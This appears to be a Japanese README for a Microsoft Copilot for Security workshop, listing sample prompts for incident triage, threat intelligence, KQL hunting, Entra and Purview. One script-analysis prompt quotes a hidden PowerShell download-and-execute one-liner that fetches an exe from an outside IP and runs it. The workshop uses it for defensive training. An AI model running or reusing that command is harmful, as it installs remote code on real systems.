![Security CoPilot Logo](https://github.com/ninjyanaka/Copilot-For-Security/blob/main/Promptbook%20samples/ic_fluent_copilot_64_64%402x.png)
# Microsoft Copilot for Security Workshop


https://securitycopilot.microsoft.com/

ポータルサイト一覧：
[Copilot for Security](https://securitycopilot.microsoft.com/)
&nbsp;
[Microsoft Defender XDR Portal](https://security.microsoft.com/)
&nbsp;
[Microsoft Purview Portal](https://purview.microsoft.com/)

***
&nbsp;
## ハンズオンシナリオ➁ インシデント分析編

 ```
Microsoft Defender XDRから、優先すべき重大度の高いインシデントの上位5件を教えて
 ```
 ```
Defender XDR Incident 50 について教えて
 ```
 ```
Defender XDR Incident 50 に関連するエンティティについて教えて
 ```
 ```
MDTIを使用して、このIPアドレス 185.220.101.86 のレピュテーションスコアを教えて
 ```
 ```
VirusTotal を使用して、このIPアドレス 185.220.101.86 のレピュテーションスコアを教えて
 ```
 ```
調査結果をエグゼクティブ・レポートにまとめて
 ```

***
&nbsp;
## ハンズオンシナリオ➁　スクリプト分析編

 ```
以下のスクリプトは、どのような動作をするのか、順を追って説明し、その意図を推測してください
Script:powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference = 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://185.82.217.3/1.exe', 'C:\\test-WDATP-test\\invoice.exe');Start-Process 'C:\\test-WDATP-test\\invoice.exe'\\invoice.exe'
 ```

***
&nbsp;
## ハンズオンシナリオ➁　脅威インテリジェンス編

 ```
私はセキュリティエンジニアです。攻撃アクターグループ Volt Typhoon について教えて
 ```

***
&nbsp;
## ハンズオンシナリオ➂　Azure AI Search、ファイル
Azure AI Search
```
Azure AI Search プラグインを使用して、インシデントの対応手順を教えて
```

ファイル
```
CVE-2024-3400について教えて
```
その後、Query Uploaded Filesスキルを利用


***
&nbsp;
## ハンズオンシナリオ➂　アドバンスドハンティング　KQL

```
NL2KQL for Defender を使用して、エンドポイントからIPv4アドレスの 101.35.198.64 への通信教えて
```

***
&nbsp;
## ハンズオンシナリオ➃　Defender XDR 


***
&nbsp;
## ハンズオンシナリオ➃　脅威インテリジェンス



***
&nbsp;
## ハンズオンシナリオ➃　Entra

```
ユーザー <UPN> について教えて
```
```
ユーザー <UPN> に対してどのような認証方法が有効になっていますか？
```
```
NL2KQL for Sentinel を使用して,SigninLogsから "UPN" のSign-in ログ見せて
```


***
&nbsp;
## ハンズオンシナリオ➃　Purview

```
Microsoft Purview から、優先すべき重大度の高いアラートの上位5件を教えて
```
```
アラートID　dl13063524-3948-d713-2a00-08dcbd250086　について教えて
```
```
調査結果をエグゼクティブ・レポートにまとめて
```


***
&nbsp;
## ハンズオンシナリオ➄ Logic Apps - Email 分析
